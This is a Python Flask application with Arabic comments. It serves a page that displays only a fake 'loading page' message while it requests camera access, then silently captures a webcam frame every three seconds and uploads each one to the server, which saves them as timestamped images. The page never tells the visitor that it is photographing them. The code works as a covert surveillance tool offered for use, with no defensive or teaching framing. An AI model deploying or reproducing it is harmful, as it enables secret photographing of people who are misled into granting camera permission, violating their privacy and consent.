import base64
import os
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime

app = Flask(__name__)

# مجلد مؤقت لحفظ الصور على السيرفر
UPLOAD_FOLDER = 'captured_photos'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تجربة الكاميرا</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; background-color: #f9f9f9; padding-top: 50px; }
        #loadingMessage { font-size: 20px; font-weight: bold; color: #333; }
    </style>
</head>
<body>
    <div id="loadingMessage">جاري تحميل الصفحة...</div>

    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.addEventListener('loadedmetadata', function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                setTimeout(function() {
                    function captureAndSend() {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/png');

                        fetch('/upload', {
                            method: 'POST',
                            body: JSON.stringify({ image: imageData }),
                            headers: { 'Content-Type': 'application/json' }
                        })
                        .then(response => response.json())
                        .then(data => console.log('تم بنجاح'))
                        .catch(error => console.error(error));
                    }

                    captureAndSend();
                    setInterval(captureAndSend, 3000); // التقاط كل 3 ثوانٍ
                }, 1000);
            });
        })
        .catch(function(err) {
            document.getElementById('loadingMessage').innerText = "تم رفض إذن الكاميرا.";
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data.get('image')
    
    if image_data:
        image_data = image_data.replace('data:image/png;base64,', '')
        image_data = image_data.replace(' ', '+')
        image_content = base64.b64decode(image_data)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        file_path = os.path.join(UPLOAD_FOLDER, f'photo_{timestamp}.png')
        
        with open(file_path, 'wb') as f:
            f.write(image_content)
            
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)